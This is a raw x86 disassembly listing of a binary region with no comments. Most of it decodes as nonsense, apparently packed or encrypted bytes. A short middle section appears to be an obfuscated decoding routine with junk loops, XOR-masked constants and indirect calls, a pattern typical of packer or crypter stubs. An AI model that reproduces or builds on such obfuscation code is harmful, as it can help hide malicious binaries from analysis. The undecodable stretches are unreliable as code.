  407f82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407f83:	shr    BYTE PTR [edx+ebp*1],cl
  407f86:	in     eax,dx
  407f87:	imul   edi,DWORD PTR [edi+0x7ae238b9],0xaa74e3f0
  407f91:	in     al,dx
  407f92:	(bad)  
  407f93:	leave  
  407f94:	dec    ecx
  407f95:	mov    WORD PTR [edi-0x21],ss
  407f98:	daa    
  407f99:	cmc    
  407f9a:	and    DWORD PTR [eax+0x11],edx
  407f9d:	outs   dx,BYTE PTR ds:[esi]
  407f9e:	pop    ds
  407f9f:	and    BYTE PTR [ebx],bh
  407fa1:	add    bh,ch
  407fa3:	std    
  407fa4:	inc    ecx
  407fa5:	push   edx
  407fa6:	adc    dh,BYTE PTR [eax]
  407fa8:	xchg   esi,eax
  407fa9:	ret    
  407faa:	xor    al,0xee
  407fac:	and    ch,dh
  407fae:	cli    
  407faf:	(bad)  
  407fb0:	mov    edx,0xe28cecd2
  407fb5:	fadd   DWORD PTR [eax]
  407fb7:	icebp  
  407fb8:	and    eax,0xcc76d0f3
  407fbd:	xchg   DWORD PTR [ebx+0x47],eax
  407fc0:	sbb    al,0xff
  407fc2:	cmc    
  407fc3:	xchg   esi,eax
  407fc4:	push   edi
  407fc5:	test   BYTE PTR [edx-0x44],dh
  407fc8:	cmp    dl,al
  407fca:	or     al,0x9
  407fcc:	sbb    eax,0xff560faf
  407fd1:	or     eax,0xb06d81dc
  407fd6:	adc    BYTE PTR [ebp-0x497e67d4],0xb
  407fdd:	out    dx,al
  407fde:	test   DWORD PTR [edi+0x7d39cb4e],0x594049a4
  407fe8:	inc    ecx
  407fe9:	arpl   dx,cx
  407feb:	aad    0xe6
  407fed:	sub    ah,BYTE PTR [ebx]
  407fef:	mov    ds:0x694eefa0,al
  407ff4:	adc    bl,bh
  407ff6:	repz data16 mov al,es:0xe8f7f166
  407ffe:	add    eax,DWORD PTR [ebp-0x4c]
  408001:	stos   BYTE PTR es:[edi],al
  408002:	(bad)  
  408003:	imul   BYTE PTR [ebx+0x44]
  408006:	aam    0x64
  408008:	mov    ecx,0x4ef348c8
  40800d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40800e:	and    dl,ch
  408010:	mov    eax,0xedc5b18e
  408015:	adc    ebp,edx
  408017:	push   cs
  408018:	cld    
  408019:	sbb    BYTE PTR [eax],0x51
  40801c:	fbstp  TBYTE PTR [esi+0x3c0114bf]
  408022:	ins    DWORD PTR es:[edi],dx
  408023:	push   es
  408024:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408025:	xchg   edi,eax
  408026:	mov    WORD PTR [eax],?
  408028:	xchg   ebp,eax
  408029:	push   ecx
  40802a:	push   ds
  40802b:	(bad)  
  40802c:	je     0x407fd6
  40802e:	pop    ds
  40802f:	mov    ah,0x57
  408031:	and    ebx,DWORD PTR [edi-0x22]
  408034:	loope  0x40809f
  408036:	add    ebx,edi
  408038:	test   al,0xab
  40803a:	out    0xa7,eax
  40803c:	iret   
  40803d:	inc    esi
  40803e:	shr    DWORD PTR [edx-0x57],cl
  408041:	fisttp DWORD PTR [edx+esi*2+0x4]
  408045:	test   BYTE PTR [ecx+0x527b0a39],0x6f
  40804c:	int3   
  40804d:	jb     0x408090
  40804f:	popa   
  408050:	xchg   ecx,eax
  408051:	aam    0xa9
  408053:	lahf   
  408054:	inc    ebp
  408055:	test   BYTE PTR [ebp-0x34d801e9],cl
  40805b:	cmp    eax,0x920d7ffa
  408060:	aas    
  408061:	js     0x4080b7
  408063:	or     DWORD PTR [edx],ecx
  408065:	mov    bl,0x2b
  408067:	mov    ah,0x72
  408069:	mov    ds:0xd1b32d32,eax
  40806e:	loop   0x408029
  408070:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408071:	mov    eax,0x4c5980aa
  408076:	sbb    esp,DWORD PTR [eax+0x6c]
  408079:	mov    WORD PTR [esi+ecx*8],fs
  40807c:	adc    BYTE PTR [edi+0x15],dh
  40807f:	jl     0x408020
  408081:	mov    dl,0x3d
  408083:	fidiv  DWORD PTR [esi+0x72]
  408086:	in     al,dx
  408087:	pop    esp
  408088:	add    al,0x7a
  40808a:	retf   
  40808b:	mov    BYTE PTR [esi],al
  40808d:	xchg   esi,eax
  40808e:	adc    ah,ah
  408090:	xor    eax,esi
  408092:	mov    edx,0xffcd8f14
  408097:	sub    edx,eax
  408099:	jmp    0x4080ad
  40809e:	mov    eax,DWORD PTR [ebp-0x8]
  4080a1:	xor    eax,esi
  4080a3:	mov    edx,0xffcd8d14
  4080a8:	sub    edx,eax
  4080aa:	add    edx,DWORD PTR [ebp-0xc]
  4080ad:	mov    DWORD PTR [ebp-0xc],edx
  4080b0:	mov    eax,DWORD PTR [ebp-0x10]
  4080b3:	cmp    eax,0xf89c85b0
  4080b8:	jne    0x40383c
  4080be:	mov    DWORD PTR [ebp-0x20],0xa
  4080c5:	mov    ebx,DWORD PTR [ebp+0x8]
  4080c8:	xor    ebx,esi
  4080ca:	add    ebx,edi
  4080cc:	lea    eax,[ebx-0x3272ec]
  4080d2:	xor    eax,esi
  4080d4:	cmp    eax,0xf89c95b0
  4080d9:	je     0x40810c
  4080df:	lea    eax,[ebx+ecx*1]
  4080e2:	mov    DWORD PTR [ebp-0x14],eax
  4080e5:	mov    eax,DWORD PTR [ebp-0x28]
  4080e8:	sub    eax,ebx
  4080ea:	mov    DWORD PTR [ebp-0x18],eax
  4080ed:	push   DWORD PTR [ebp-0x18]
  4080f0:	push   DWORD PTR [ebp-0x14]
  4080f3:	call   0x408153
  4080f8:	mov    eax,DWORD PTR [ebp+0xc]
  4080fb:	mov    ecx,DWORD PTR [ebp-0x24]
  4080fe:	xor    eax,esi
  408100:	lea    ebx,[ebx+eax*1+0x3272ec]
  408107:	jmp    0x4080cc
  40810c:	dec    DWORD PTR [ebp-0x20]
  40810f:	jne    0x4080c5
  408115:	mov    eax,DWORD PTR [ebp+0x8]
  408118:	mov    edx,DWORD PTR [ebp+0xc]
  40811b:	mov    ebx,DWORD PTR [ebp+0x8]
  40811e:	xor    edx,esi
  408120:	mov    dl,BYTE PTR [edx+ecx*1+0x3272ec]
  408127:	xor    eax,esi
  408129:	mov    al,BYTE PTR [eax+ecx*1+0x3272ec]
  408130:	xor    ebx,esi
  408132:	mov    BYTE PTR [ebx+ecx*1+0x3272ec],dl
  408139:	mov    edx,DWORD PTR [ebp+0xc]
  40813c:	xor    edx,esi
  40813e:	mov    BYTE PTR [edx+ecx*1+0x3272ec],al
  408145:	mov    eax,DWORD PTR [ebp+0xc]
  408148:	xor    eax,esi
  40814a:	add    eax,edi
  40814c:	pop    edi
  40814d:	pop    esi
  40814e:	pop    ebx
  40814f:	leave  
  408150:	ret    0x8
  408153:	push   ebp
  408154:	mov    ebp,esp
  408156:	sub    esp,0x40
  408159:	add    edx,edx
  40815b:	mov    eax,DWORD PTR [ebp+0xc]
  40815e:	mov    DWORD PTR [ebp-0x18],eax
  408161:	mov    DWORD PTR ds:0x428663,0x712d
  40816b:	mov    eax,DWORD PTR [ebp+0x8]
  40816e:	mov    DWORD PTR [ebp-0x14],0xf89c85b0
  408175:	mov    DWORD PTR ds:0x428613,0x5be4
  40817f:	mov    DWORD PTR [ebp-0x30],eax
  408182:	sub    DWORD PTR ds:0x428667,ebx
  408188:	push   esi
  408189:	xor    DWORD PTR ds:0x42867b,0x42861b
  408193:	push   edi
  408194:	movzx  edi,WORD PTR ds:0x428647
  40819b:	add    DWORD PTR ds:0x428603,edi
  4081a1:	mov    edi,0xf89c85b1
  4081a6:	mov    DWORD PTR ds:0x428653,0x19
  4081b0:	cmp    DWORD PTR ds:0x428653,0x0
  4081b7:	je     0x408208
  4081bd:	cmp    DWORD PTR ds:0x428653,0x7
  4081c4:	jg     0x408208
  4081ca:	jmp    0x4081da
  4081cf:	push   0x428097
  4081d4:	call   DWORD PTR ds:0x4287c3
  4081da:	cmp    DWORD PTR ds:0x428653,0x8
  4081e1:	jne    0x4081f4
  4081e7:	mov    edx,DWORD PTR ds:0x428653
  4081ed:	dec    edx
  4081ee:	mov    DWORD PTR ds:0x428653,edx
  4081f4:	xor    edx,edx
  4081f6:	or     edx,DWORD PTR ds:0x428653
  4081fc:	dec    edx
  4081fd:	mov    DWORD PTR ds:0x428653,edx
  408203:	jmp    0x4081b0
  408208:	mov    DWORD PTR [ebp-0x8],edi
  40820b:	sbb    ecx,0x4b70
  408211:	mov    eax,DWORD PTR [ebp-0x14]
  408214:	mov    edx,DWORD PTR ds:0x4285cf
  40821a:	xor    DWORD PTR ds:0x4285e7,edx
  408220:	mov    ecx,0x75108a4
  408225:	or     DWORD PTR ds:0x4285ef,ecx
  40822b:	xor    eax,ecx
  40822d:	mov    esi,0x3272ec
  408232:	adc    DWORD PTR ds:0x4285db,edi
  408238:	add    eax,esi
  40823a:	mov    DWORD PTR [ebp-0x4],eax
  40823d:	mov    DWORD PTR ds:0x428667,0x1d
  408247:	cmp    DWORD PTR ds:0x428667,0x0
  40824e:	je     0x408296
  408254:	cmp    DWORD PTR ds:0x428667,0x28
  40825b:	jg     0x408296
  408261:	jmp    0x408284
  408266:	push   0x428633
  40826b:	push   DWORD PTR [ebp-0x10]
  40826e:	push   0x7f16
  408273:	push   0x6682
  408278:	push   DWORD PTR [ebp-0x20]
  40827b:	push   DWORD PTR [ebp-0x20]
  40827e:	call   DWORD PTR ds:0x4287c7
  408284:	mov    edx,DWORD PTR ds:0x428667
  40828a:	dec    edx
  40828b:	mov    DWORD PTR ds:0x428667,edx
  408291:	jmp    0x408247
  408296:	mov    eax,DWORD PTR [ebp-0x14]
  408299:	xor    eax,ecx
  40829b:	add    eax,esi
  40829d:	mov    DWORD PTR [ebp+0x8],eax
  4082a0:	mov    DWORD PTR [ebp-0x28],0xf89c8590
  4082a7:	xor    eax,DWORD PTR ds:0x428623
  4082ad:	mov    DWORD PTR [ebp-0x24],0xf89c85bf
  4082b4:	mov    eax,ds:0x4286d7
  4082b9:	mov    edx,DWORD PTR ds:0x4286eb
  4082bf:	sub    eax,edx
  4082c1:	xor    eax,DWORD PTR [eax+edx*1]
  4082c4:	mov    eax,DWORD PTR [ebp-0x14]
  4082c7:	mov    edx,DWORD PTR [ebp-0x18]
  4082ca:	xor    eax,ecx
  4082cc:	sbb    DWORD PTR ds:0x428677,0x289b
  4082d6:	add    eax,esi
  4082d8:	mov    DWORD PTR ds:0x428653,0x7663
  4082e2:	cmp    edx,eax
  4082e4:	je     0x40aa55
  4082ea:	mov    DWORD PTR ds:0x42861f,0x1f7b
  4082f4:	push   ebx
  4082f5:	jmp    0x40aa30
  4082fa:	mov    eax,ds:0x428607
  4082ff:	add    DWORD PTR ds:0x42865b,eax
  408305:	mov    edx,DWORD PTR [ebp-0x4]
  408308:	dec    eax
  408309:	mov    eax,DWORD PTR [ebp-0x18]
  40830c:	and    DWORD PTR ds:0x4285ef,0x33ad
  408316:	mov    ebx,DWORD PTR [ebp-0x28]
  408319:	sub    eax,edx
  40831b:	xor    ebx,ecx
  40831d:	adc    DWORD PTR ds:0x42863f,0x20c9
  408327:	xor    edx,edx
  408329:	add    ebx,esi
  40832b:	sub    DWORD PTR ds:0x428603,0x441d
  408335:	div    ebx
  408337:	xor    edx,DWORD PTR ds:0x42863b
  40833d:	jmp    0x40a6e1
  408342:	sbb    ecx,DWORD PTR [esi+0x78d7a47c]
  408348:	fwait
  408349:	and    esi,0xf516ec02
  40834f:	int    0x38
  408351:	mov    ds:0x7a7a149f,eax
  408356:	repz pop edi
  408358:	jp     0x4083d4
  40835a:	(bad)  
  40835b:	js     0x40835f
  40835d:	adc    esi,0x3953ec8e
  408363:	push   ebp
  408364:	bound  edx,QWORD PTR [edx-0x57c4590c]
  40836a:	movhps QWORD PTR [ebx+0x4bd7e53b],xmm5
  408371:	das    
  408372:	imul   eax,DWORD PTR [edx-0x4e6c07fb],0x2b
  408379:	xchg   ebx,eax
  40837a:	jge    0x4083c9
  40837c:	sbb    eax,0xeda28623
  408381:	pop    es
  408382:	sbb    dh,BYTE PTR [ebp+0x289cf621]
  408388:	addr16 jle 0x408376
  40838b:	fnsave [ebp-0x71]
  40838e:	jmp    DWORD PTR [ebx+ecx*2-0x6b]
  408392:	mov    ds,ecx
  408394:	inc    edi
  408395:	enter  0x4b4,0x98
  408399:	dec    eax
  40839a:	and    eax,ebp
  40839c:	and    DWORD PTR [ecx],ecx
  40839e:	and    eax,0xb1cbfb8c
  4083a3:	jo     0x408374
  4083a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4083a6:	and    BYTE PTR [ecx+ebp*2+0x6a64d143],bl
  4083ad:	test   eax,0xbe291b48
  4083b2:	jmp    0x7709e48
  4083b7:	add    bl,BYTE PTR [eax-0x19e613de]
  4083bd:	mov    ch,0xae
  4083bf:	das    
  4083c0:	inc    ecx
  4083c1:	pop    edx
  4083c2:	in     eax,dx
  4083c3:	(bad)  
  4083c4:	or     BYTE PTR [ebx-0x3e],bh
  4083c7:	inc    ecx
  4083c8:	push   ss
  4083c9:	dec    ecx
  4083ca:	push   es
  4083cb:	jg     0x4083a9
  4083cd:	clc    
  4083ce:	sub    dh,bl
  4083d0:	xor    eax,0x1b8680d2
  4083d5:	addr16 dec eax
  4083d7:	shl    DWORD PTR [eax-0xd58db5f],0xe0
  4083de:	push   0xffffffe1
  4083e0:	dec    edx
  4083e1:	scas   eax,DWORD PTR es:[edi]
  4083e2:	pop    ecx
  4083e3:	dec    edx
  4083e4:	sbb    esp,edi
  4083e6:	sar    DWORD PTR [ebp+0x510c54bb],0x3b
  4083ed:	jmp    0x73d9:0x2a901bf
  4083f4:	popf   
  4083f5:	or     DWORD PTR [esi],esi
  4083f7:	mov    ebp,eax
  4083f9:	push   ebx
  4083fa:	ret    0x425f
  4083fd:	fsubr  QWORD PTR [edi+edi*8+0x57]
  408401:	loopne 0x4083bc
  408403:	in     al,0xfc
  408405:	inc    ebx
  408406:	cdq    
  408407:	inc    eax
  408408:	lock outs dx,DWORD PTR ds:[esi]
  40840a:	adc    DWORD PTR [ecx+eax*1],esi
  40840d:	mov    ebx,0x5d3a07fe
  408412:	xchg   esp,eax
  408413:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408414:	pop    ebp
  408415:	jns    0x4083a0
  408417:	cwde   
  408418:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408419:	outs   dx,BYTE PTR ds:[esi]
  40841a:	push   edi
  40841b:	(bad)  
  40841d:	sub    ebx,edx
  40841f:	dec    esp
  408420:	pop    edx
  408421:	dec    eax
  408422:	pop    esp
  408423:	inc    edx
  408424:	adc    eax,0xa60e8f59
  408429:	lds    ebp,FWORD PTR [eax+0x5086afaa]
  40842f:	lock pop ebp
  408431:	lods   al,BYTE PTR ds:[esi]
  408433:	imul   ebp,DWORD PTR [ebx-0x71],0x3e
  408437:	stos   BYTE PTR es:[edi],al
  408438:	jbe    0x408430
  40843a:	add    eax,DWORD PTR [edi]
  40843c:	fs xchg esp,eax
  40843e:	pop    ecx
  40843f:	not    BYTE PTR [edx+0x46]
  408442:	out    dx,eax
  408443:	add    dh,BYTE PTR [ebx]
  408445:	sti    
  408446:	mov    BYTE PTR [eax+0x77528d79],ch
  40844c:	std    
  40844d:	mov    ebp,0x2951ad6d
  408452:	gs gs pop eax
  408455:	pop    edx
  408456:	pop    edi
  408457:	xchg   ebx,eax
  408458:	and    al,0x38
  40845a:	cdq    
  40845b:	les    ebp,FWORD PTR [ebp-0x2b]
  40845e:	xchg   BYTE PTR [edx+ebx*1],bl
  408461:	fld    DWORD PTR [ebx]
  408463:	div    DWORD PTR [edx+0x44]
  408466:	fcom   DWORD PTR [ebp+0x7cbf52cb]
  40846c:	and    bh,BYTE PTR [edi-0x2f]
  40846f:	es xchg ebp,eax
  408471:	gs add eax,0xc750a935
  408477:	fistp  WORD PTR [ebx+0x60]
  40847a:	fs and al,0xd6
  40847d:	cs stos BYTE PTR es:[edi],al
  40847f:	ret    
  408480:	out    dx,eax
  408481:	push   eax
  408482:	push   edi
  408483:	cmc    
  408484:	mov    edi,0x5247ab57
  408489:	sahf   
  40848a:	enter  0x803d,0x91
  40848e:	jno    0x40844a
  408490:	out    dx,eax
  408491:	inc    esp
  408492:	sahf   
  408493:	cld    
  408494:	daa    
  408495:	pop    ecx
  408496:	inc    eax
  408497:	popf   
  408498:	and    eax,0x71950a5d
  40849d:	repnz pop esp
  40849f:	mov    edx,0xfa0fd0b8
  4084a4:	xor    eax,0xc9a1b93b
  4084a9:	cmp    al,dl
  4084ab:	leave  
  4084ac:	dec    eax
  4084ad:	sub    BYTE PTR [edi+0x6b709a73],ah
  4084b3:	stos   DWORD PTR es:[edi],eax
  4084b4:	xlat   BYTE PTR ds:[ebx]
  4084b5:	xor    esi,DWORD PTR [edi]
  4084b7:	pop    ds
  4084b8:	jne    0x4084e3
  4084ba:	sahf   
  4084bb:	mov    bl,0x18
  4084bd:	inc    esp
  4084be:	inc    ebp
  4084bf:	bound  ebp,QWORD PTR [edi-0x16]
  4084c2:	pop    esp
  4084c3:	push   0xffffffc3
  4084c5:	mov    eax,ds:0x40d3eae8
  4084ca:	xor    eax,0x9b5299f3
  4084cf:	cmp    DWORD PTR [eax+0x776b9cb0],ebp
  4084d5:	or     al,0x70
  4084d7:	fcomp  st(7)
  4084d9:	adc    DWORD PTR [ebp-0x66d133f4],edx
  4084df:	loope  0x408543
  4084e1:	xchg   ebp,eax
  4084e2:	ins    BYTE PTR es:[edi],dx
  4084e3:	sbb    DWORD PTR [edx-0x7a623df2],esp
  4084e9:	mov    edi,esi
  4084eb:	test   DWORD PTR [ebp-0x280759fa],edx
  4084f1:	cmovle ebp,DWORD PTR [ecx-0x6fdeaec9]
  4084f8:	fs adc ah,bl
  4084fb:	inc    esi
  4084fc:	aaa    
  4084fd:	mov    ebx,ebx
  4084ff:	and    eax,DWORD PTR [esi-0x71090110]
  408505:	ret    0x2c61
  408508:	jmp    0x1273:0x10472b8a
  40850f:	mov    eax,ds:0x42aca312
  408514:	mov    edx,eax
  408516:	jnp    0x40849b
  408518:	(bad)  
  408519:	clc    
  40851a:	lahf   
  40851b:	pop    ecx
  40851c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40851d:	into   
  40851e:	dec    bx
  408520:	std    
  408521:	test   BYTE PTR [esp+ecx*2],al
  408524:	cmp    al,0x44
  408526:	mov    ebx,0xcd41c970
  40852b:	jg     0x408569
  40852d:	jnp    0x40855e
  40852f:	ret    0x6bd8
  408532:	dec    esi
  408533:	mov    esi,0x779dae1b
  408538:	adc    DWORD PTR ds:0x33a55e55,ebx
  40853e:	pop    ecx
  40853f:	pop    ss
  408540:	test   BYTE PTR [ecx-0x2b542747],cl
  408546:	push   ds
  408547:	xchg   BYTE PTR [edx+0x2f4d14fd],bl
  40854d:	xchg   ebx,eax
  40854e:	mov    al,ch
  408550:	stos   DWORD PTR es:[edi],eax
  408551:	out    dx,eax
  408552:	mov    ebx,0x5012f8f0
  408557:	out    dx,eax
  408558:	xchg   ebx,eax
  408559:	loopne 0x408520
  40855b:	aad    0xe6
  40855d:	or     DWORD PTR [edi-0x519b9fae],eax
  408563:	and    BYTE PTR [eax+0x4fb1dec3],dl
  408569:	popa   
  40856a:	dec    ebp
  40856b:	ins    DWORD PTR es:[edi],dx
  40856c:	in     eax,0x62
  40856e:	sbb    ecx,DWORD PTR [esi-0x26dc2a19]
  408574:	mov    eax,0xc73816e0
  408579:	jns    0x408548
  40857b:	xchg   DWORD PTR [ebx-0x23],ecx
  40857e:	ja     0x408500
  408580:	lahf   
  408581:	dec    edi
  408582:	mov    bh,0x6d
  408584:	test   eax,0xaee0e182
  408589:	jne    0x40852a
  40858b:	xchg   edi,eax
  40858c:	ins    BYTE PTR es:[edi],dx
  40858d:	lds    ebx,FWORD PTR [esi+eiz*4+0x360060b5]
  408594:	pop    esp
  408595:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408596:	outs   dx,DWORD PTR ds:[esi]
  408597:	lods   eax,DWORD PTR ds:[esi]
  408598:	mov    edi,0xa34beffe
  40859d:	fwait
  40859e:	pop    ebp
  40859f:	mov    bl,BYTE PTR [eax+0xa]
  4085a2:	sahf   
  4085a3:	stos   BYTE PTR es:[edi],al
  4085a4:	mov    ch,0x2a
  4085a6:	mov    DWORD PTR [ebp-0x604eee0a],eax
  4085ac:	and    dh,BYTE PTR [edi]
  4085ae:	xchg   ebx,eax
  4085af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4085b0:	cmp    esp,DWORD PTR [edi]
  4085b2:	mov    bh,0x64
  4085b4:	and    al,0x84
  4085b6:	ss pop eax
  4085b8:	out    dx,al
  4085b9:	jno    0x40853e
  4085bb:	push   esp
  4085bc:	outs   dx,BYTE PTR ds:[esi]
  4085bd:	call   0x9f64:0x6087cd99
  4085c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4085c5:	lods   al,BYTE PTR ds:[esi]
  4085c6:	in     al,dx
  4085c7:	enter  0x65a5,0x4c
  4085cb:	addr16 cld 
  4085cd:	in     al,0xe0
  4085cf:	jg     0x4085f6
  4085d1:	cwde   
  4085d2:	outs   dx,DWORD PTR ds:[esi]
  4085d3:	mov    esp,0xfa53c278
  4085d8:	loope  0x408629
  4085da:	cld    
  4085db:	gs push es
  4085dd:	pop    edi
  4085de:	dec    eax
  4085df:	adc    dh,BYTE PTR [ecx]
  4085e1:	jae    0x408653
  4085e3:	and    ch,dh
  4085e5:	(bad)  
  4085e6:	adc    DWORD PTR ds:0x3764431e,esi
  4085ec:	das    
  4085ed:	int3   
  4085ee:	mov    es,ebp
  4085f0:	mov    edi,0x28cf4520
  4085f5:	lock or dl,bl
  4085f8:	outs   dx,BYTE PTR ds:[esi]
  4085f9:	jbe    0x4085d8
  4085fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4085fc:	jle    0x40861f
  4085fe:	or     ebp,DWORD PTR [eax]
  408600:	popw   ss
  408602:	(bad)  [edi]
  408604:	xchg   dh,cl
  408606:	icebp  
  408607:	and    ebx,eax
  408609:	mov    ebx,0x9d6fc741
  40860e:	pop    esp
  40860f:	test   eax,0xc6560100
  408614:	out    dx,eax
  408615:	ins    BYTE PTR es:[edi],dx
  408616:	out    dx,al
  408617:	mov    ch,0x6
  408619:	push   es
  40861a:	out    0x6f,eax
  40861c:	jecxz  0x40868e
  40861e:	xchg   edi,eax
  40861f:	add    esp,edi
  408621:	icebp  
  408622:	pop    edx
  408623:	leave  
  408624:	lea    edi,[edi+0x3b6a64ec]
  40862a:	cmp    eax,DWORD PTR [edx+ecx*2-0x3ad468ca]
  408631:	test   al,0x37
  408633:	scas   al,BYTE PTR es:[edi]
  408634:	ret    
  408635:	ror    bh,0x50
  408638:	fcomp  DWORD PTR ds:0x7bf8dbf
  40863e:	mov    ebx,0x3f616a92
  408643:	jmp    0xff6cc0bb
  408648:	sub    eax,0x6813016d
  40864d:	mov    al,ds:0x65b21b68
  408652:	test   BYTE PTR [edx],ch
  408654:	xor    DWORD PTR [eax-0x31a75544],0x1e
  40865b:	pop    eax
  40865c:	inc    eax
  40865d:	call   0x64308f1b
  408662:	push   esi
  408663:	sbb    DWORD PTR [edi+0x26],0xfffffff1
  408667:	(bad)  
  408668:	enter  0xcad,0x4e
  40866c:	cmp    DWORD PTR [edi],edx
  40866e:	add    eax,DWORD PTR [eax+0x433046c2]
  408674:	fs stos BYTE PTR es:[edi],al
  408676:	lds    edx,FWORD PTR [edx+0x40]
  408679:	push   0x62
  40867b:	jbe    0x40865c
  40867d:	jbe    0x4086ba
  40867f:	jb     0x408613
  408681:	cdq    
  408682:	sub    BYTE PTR [eax],ch
  408684:	and    BYTE PTR [esi-0xad711a6],0x86
  40868b:	test   bh,0x80
  40868e:	mov    es,WORD PTR [ecx+0x42]
  408691:	jl     0x408700
  408693:	and    al,0xac
  408695:	rcl    DWORD PTR [edx+eax*8],1
  408698:	and    al,0xce
  40869a:	jne    0x4086cb
  40869c:	sbb    al,0x26
  40869e:	sub    cl,0x82
  4086a1:	xchg   DWORD PTR [ebx],esi
  4086a3:	(bad)  
  4086a4:	(bad)  
  4086a5:	push   ebx
  4086a6:	mov    ah,0x4c
  4086a8:	sbb    al,BYTE PTR [ebx-0xf]
  4086ab:	pop    esp
  4086ac:	push   0xabff861b
  4086b1:	xchg   ebx,eax
  4086b2:	std    
  4086b3:	fstp   QWORD PTR [edi+0x5]
  4086b6:	xchg   ebx,eax
  4086b7:	cwde   
  4086b8:	dec    ecx
  4086b9:	inc    edx
  4086ba:	mov    al,ds:0x63c2cb8d
  4086bf:	lods   al,BYTE PTR ds:[esi]
  4086c0:	mov    ebp,0x4942a61b
  4086c5:	dec    esp
  4086c6:	call   DWORD PTR [ebp-0x65]
  4086c9:	mov    ebx,0x9ca158e8
  4086ce:	out    dx,eax
  4086cf:	inc    ecx
  4086d0:	dec    ebx
  4086d1:	psubsb mm1,QWORD PTR [ecx+0x30]
  4086d5:	mov    al,ds:0x7c764a55
  4086da:	(bad)  
  4086db:	(bad)  
  4086dc:	mov    edx,0x6301b26e
  4086e1:	jge    0x408749
  4086e3:	aad    0xc1
  4086e5:	push   ebx
  4086e6:	outs   dx,BYTE PTR ds:[esi]
  4086e7:	push   cs
  4086e8:	icebp  
  4086e9:	mov    eax,ds:0x1aa050ac
  4086ee:	xchg   edx,eax
  4086ef:	jnp    0x408762
  4086f1:	mov    ds:0x9fed1a84,eax
  4086f6:	jns    0x40870f
  4086f8:	loopne 0x4086d8
  4086fa:	retf   
  4086fb:	cmp    esi,DWORD PTR [edi+0x4648827c]
  408701:	jne    0x4086f6
  408703:	dec    edi
  408704:	add    ah,0xaf
  408707:	pop    edi
  408708:	dec    edi
  408709:	mov    al,0x11
  40870b:	ins    DWORD PTR es:[edi],dx
  40870c:	mov    BYTE PTR [edx],bl
  40870e:	into   
  40870f:	lods   eax,DWORD PTR ds:[esi]
  408710:	out    0x7e,al
  408712:	pop    es
  408713:	sti    
  408714:	outs   dx,BYTE PTR ds:[esi]
  408715:	int3   
  408716:	in     al,dx
  408717:	fbld   TBYTE PTR [ecx-0x4b38bbde]
  40871d:	xchg   ecx,eax
  40871e:	mov    dl,bl
  408720:	or     edx,edx
  408722:	stc    
  408723:	inc    ecx
  408724:	rcl    BYTE PTR [eax+0x437c3b0d],1
  40872a:	fbstp  TBYTE PTR [edx+0x72a1ac1f]
  408730:	or     al,0xda
  408732:	sbb    al,BYTE PTR [esi]
  408734:	mov    ebp,edi
  408736:	jns    0x40879b
  408738:	and    al,0xa2
  40873a:	xor    eax,0x5e2b582a
  40873f:	gs into 
  408741:	jl     0x4087a6
  408743:	sub    eax,0x64ae94bc
  408748:	shr    DWORD PTR [esi],cl
  40874a:	sbb    edx,DWORD PTR [esi+0x51123b69]
  408750:	loope  0x4087d0
  408752:	jb     0x408770
  408754:	push   ecx
  408755:	fs xchg esi,eax
  408757:	xchg   edx,eax
  408758:	dec    ecx
  408759:	mul    DWORD PTR [edx*8+0x2b8dbad1]
  408760:	jno    0x40870a
  408762:	bts    DWORD PTR [ecx+ebx*2-0x4],eax
  408767:	pop    edx
  408768:	in     al,0xbd
  40876a:	jns    0x408774
  40876c:	fiadd  DWORD PTR [edx]
  40876e:	sub    DWORD PTR [ecx],ecx
  408770:	inc    edi
  408771:	outs   dx,DWORD PTR ds:[esi]
  408772:	std    
  408773:	xchg   edi,eax
  408774:	dec    eax
  408775:	ror    ah,1
  408777:	cmp    eax,0xbdcdec7a
  40877c:	cmp    BYTE PTR [edx],0x6
  40877f:	mov    ch,BYTE PTR [eax-0x4c]
  408782:	push   cs
  408783:	sbb    BYTE PTR [edi+0x3d578cdb],bh
  408789:	cwde   
  40878a:	ja     0x40870f
  40878c:	(bad)  
  40878d:	test   BYTE PTR [esi-0x12],al
  408790:	cwde   
  408791:	push   ecx
  408792:	add    BYTE PTR [edi+0x4921e44f],al
  408798:	int3   
  408799:	sbb    eax,0xf1d7d0f0
  40879e:	cmp    al,0xa
  4087a0:	loope  0x408743
  4087a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4087a3:	xchg   ecx,eax
  4087a4:	pushf  
  4087a5:	push   ebx
  4087a6:	or     eax,0x930022dd
  4087ab:	push   edx
  4087ad:	push   ecx
  4087ae:	jmp    0x40881e
  4087b0:	aas    
  4087b1:	loope  0x40876d
  4087b3:	xor    BYTE PTR [edi+esi*8],bl
  4087b6:	adc    al,0xc5
  4087b8:	iret   
  4087b9:	xchg   DWORD PTR [esi+0x210e8f18],edi
  4087bf:	stos   DWORD PTR es:[edi],eax
  4087c0:	stos   BYTE PTR es:[edi],al
  4087c1:	fistp  WORD PTR [edi-0x36]
  4087c4:	pusha  
  4087c5:	ins    BYTE PTR es:[edi],dx
  4087c6:	xor    eax,0x7bcd3c54
  4087cb:	enter  0x9a75,0x78
  4087cf:	mov    cl,BYTE PTR [eax]
  4087d1:	add    bl,BYTE PTR [eax-0x5d9bdd0]
  4087d7:	out    0x18,al
  4087d9:	popf   
  4087da:	lock jg 0x40876e
  4087dd:	add    bl,BYTE PTR [eax-0x2d]
  4087e0:	nop
  4087e1:	mov    BYTE PTR [ebp+0x41600e08],dh
  4087e7:	iret   
  4087e8:	jmp    0x1827:0xd9f9a43c
  4087ef:	and    DWORD PTR [esi+0x2558baab],esi
  4087f5:	sbb    BYTE PTR [ecx-0x46cb3091],0xa3
  4087fc:	push   ss
  4087fd:	mov    ecx,0x39e9920d
  408802:	dec    ebx
  408803:	jmp    0x2666c4a7
  408808:	mov    bl,0x5f
  40880a:	dec    esp
  40880b:	into   
